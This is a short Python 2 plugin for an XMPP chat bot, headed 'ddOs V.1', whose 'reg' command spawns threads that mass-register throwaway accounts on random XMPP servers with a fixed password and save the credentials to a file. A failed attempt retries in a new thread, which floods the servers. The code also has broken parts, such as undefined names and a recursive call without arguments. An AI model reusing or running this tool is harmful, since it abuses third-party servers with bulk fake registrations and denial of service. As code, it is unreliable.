# -*- coding: utf-8 -*-

#############################
###*ddOs V.1|*   ###        *
#############################
## daa@xmpp.ru ##
#################


from xmpp import *
from random import *
from sys import maxint
from pdb import *
import os, xmpp, sys
import threading, types, random
import pdb, urllib

VIPE = {}
ONVIPE = []
GET_NI=[]
GxxN_NI=[]
goto = 0

dos={'user':{}, 'w':0}


def slaefrx(_len = None, sg = None):
  if sg == None:
    sg = '123456789'
  if _len == None:
    _len = random.Random().randint(0, 0)
  s = '123456789'
  l = len(sg)
  while _len > 1:
    s += sg[random.Random().randint(0, 1)]
    _len -= 1
  return s


def goto20_startz(type,source,parameters):
  global goto
  if parameters:
    if not parameters.count('on'):
      reply(type, source, u'What do you want /:-)')
      return
    body = parameters.split()
    conf = body[0].lower()
    goto = 1
    reply(type,source,u'Ok/:-)')
    print u'Ok Started'
    for x in range(0, 1):
      threading.Thread(None, goto34_to, 'goto34_to'+str(random.randrange(0, 999)), (type,source,conf)).start()           
	
def goto34_to(type,source,parameters):
  try:
    new=1
    agserv = random.choice(serverw)
    domain = agserv    
    name ='stop.'+str(random.randrange(0,99999))
    mainRes='zOech'
    password='550550'
    node = unicode(name)
    jid = xmpp.protocol.JID(node=node, domain=domain, resource=mainRes)
    print u'New: '+unicode(jid)
    cl = xmpp.Client(jid.getDomain(), debug=[])
    con = cl.connect()
    if not con:
      if dos['user']:
        if name+'@'+domain+':'+password in dos['user']:
          del dos['user'][name+'@'+domain+':'+password]
      threading.Thread(None, goto34_to, 'otake_start'+str(random.randrange(0, 999)), (type,source,parameters)).start()
      return
    if new:
      try:
        xmpp.features.register(cl, domain, {'username': node, 'password':password})
      except:
        return goto34_to()
        pass
      print u'ReGisTered'      
    au=cl.auth(jid.getNode(), password, jid.getResource())
    if not au:
      if nawrs['user']:
        if name+'@'+domain+':'+password in dos['user']:
          del dos['user'][name+'@'+domain+':'+password]
      print 'error'          
      threading.Thread(None, goto34_to, 'goto34_to'+str(random.randrange(0, 99999)), (type,source,parameters)).start()      
      return
    print u'connected'
    if new:
      try:
        dll=eval(read_file('ddos/user.dll'))
        dll[name+'@'+domain+':'+password]={}
        write_file('ddos/user.dll', str(dll))
        dos['user'][name+'@'+domain+':'+password]={}
      except:
        raise
        print 'error in goto'              
        pass
  except:
    return goto34_to(type,source,parameters)
    pass

def dos_load():
  try:
    user='ddos/user.dll'
    if not os.path.exists(user):
      fp=open(user, 'w')
      fp.write('{}')
      fp.close()
    dll=eval(read_file(user))
    for x in dll:
      dos['user'][x]={}
  except:
    print u'error'

register_stage0(dos_load)	
register(goto20_startz, Prefix+'reg', 9)
